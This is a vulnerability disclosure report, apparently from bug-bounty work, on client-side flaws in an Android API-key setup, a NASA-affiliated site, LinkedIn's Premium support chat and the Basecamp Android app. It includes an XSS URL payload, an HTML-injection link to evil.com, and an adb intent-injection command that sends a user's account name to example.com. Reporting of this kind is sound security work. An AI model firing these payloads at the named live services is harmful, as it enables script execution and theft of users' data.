# Client-Side Vulnerabilities Report

---

## 1. Insecure Client-Side Storage  
**Found in:** *Insecure Storage and Overly Permissive API Keys in Android App*

### Description  
Many Android applications hardcode API keys, tokens, and other sensitive information directly inside the APK for convenience. This exposes the application to client-side data leakage because anyone can decompile the app and extract those values. Once extracted, attackers can use these keys to impersonate the app, send malicious API traffic, or manipulate how the app communicates with backend services.

### Steps to Reproduce  
1. Decompile the APK using tools like **apktool**, **jadx**, or **MobSF**.  
2. Review code, configs, and resource files for sensitive hardcoded information such as:  
   - API keys  
   - Secrets  
   - Tokens  
   - Internal URLs  
3. Confirm whether the backend accepts requests using these extracted keys.

### Impact  
If an attacker extracts API keys or tokens from the app, they can generate or modify traffic as if they were the legitimate application. This may allow:  
- API misuse  
- Data tampering  
- Unauthorized operations  
- Fraudulent requests  

Although not always financially damaging, this can still lead to severe abuse if backend validation is weak.

---

## 2. DOM Clobbering  
**Found in:** https://nlsi.arc.nasa.gov/ *(NASA-affiliated domain)*

### Description  
A DOM-based reflected script execution issue was identified on the NASA-affiliated domain *nlsi.arc.nasa.gov*. The vulnerability triggers when specially crafted paths in the URL are reflected into the DOM without proper sanitization. Rather than relying on user-submitted input, the payload executes solely from URL path manipulation.

### Example Payload  
https://nlsi.arc.nasa.gov/<img src=x onerror=alert('bugcrowd:ashmitsh4rma')>

markdown
Copy code
Pasting this directly into the browser’s address bar triggers the payload, confirming that the page mishandles DOM insertion of path components.

### Impact  
- Execution of arbitrary JavaScript in the victim’s browser  
- Session hijacking or unauthorized user actions  
- Phishing opportunities via malicious NASA-branded URLs  
- Escalation pathways if combined with other vulnerabilities on related NASA properties  

### Exploitation Risks  
- Payload executes entirely client-side, making it difficult to detect  
- Can be embedded in phishing or malicious links  
- Bypasses typical input validation because the vector is the URL path  

### Resolution  
- Implement strict sanitization of DOM-inserted values  
- Properly encode URL path segments before rendering  
- Enforce a restrictive Content Security Policy (CSP)  
- Review routing logic to prevent unsafe reflections  

---

## 3. HTML Injection  
**Found in:** https://www.linkedin.com/feed *(LinkedIn Premium Support Chat)*

### Description  
A vulnerability was found in the LinkedIn Premium support chat widget. When a user submits HTML content, it is rendered directly in the chat window without sanitization. This allows an attacker to inject malicious hyperlinks or deceptive interface elements that can mislead LinkedIn staff.

### Steps to Reproduce  
1. Log in at: https://www.linkedin.com/feed  
2. In the left sidebar, click **"Try for ₹0"** under the Premium section.  
3. This opens the survey URL with redirect parameters.  
4. Wait for the support chat widget to load.  
5. Submit the following HTML payload in the chat:  
<a href="https://evil.com">CLICK</a>

markdown
Copy code
6. The link appears rendered as an actual clickable element in the chat interface.

### Impact  
**1. Phishing Attacks Against LinkedIn Employees**  
- Redirect employees to malicious websites  
- Harvest credentials or trigger malware  

**2. Social Engineering Risk**  
- Attacker can inject convincing UI-like elements  
- Employees may trust and follow harmful instructions  

**3. Reputation and Legal Exposure**  
- Compromise of staff accounts could expose internal tools or user data  
- Violates safe handling of user-generated content  

**4. Potential for Escalation**  
- If a future misconfiguration enables script execution, this becomes XSS  
- Could lead to full session compromise  

### Recommendations  
- Sanitize all content using libraries like **DOMPurify**  
- Encode user content before rendering  
- Audit chat components for further injection points  

---

## 4. JavaScript Injection (Non-XSS)  
**Found in:** *Android application:* `com.basecamp.bc3`

### Description  
The Basecamp BC3 Android application contains a WebView with JavaScript enabled and extended functionality through JavaScript interfaces. Since the URL parameters are not sanitized, attackers can inject arbitrary JavaScript into the WebView. The injected code gains access to native Java methods exposed through the `nativeBridge` interface, allowing extraction of sensitive data.

### Steps to Reproduce  
1. Create a valid Basecamp account.  
2. Create a project and open any sub-project tab (only once to initialize the JS interface).  
3. Run the following command, replacing `XXXXX` with the user ID:  
adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'

markdown
Copy code
4. Monitor exfiltration through HTTP logs:  
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2
Host: example.com

yaml
Copy code

### Impact  
- Full compromise of confidentiality, integrity, and availability  
- Arbitrary JavaScript execution inside the app’s WebView  
- Access to sensitive data via exposed Java interfaces  
- Ability to exfiltrate:  
- Bucket names  
- Page titles  
- User email addresses  
- Potential cookie theft and unauthorized account access  

---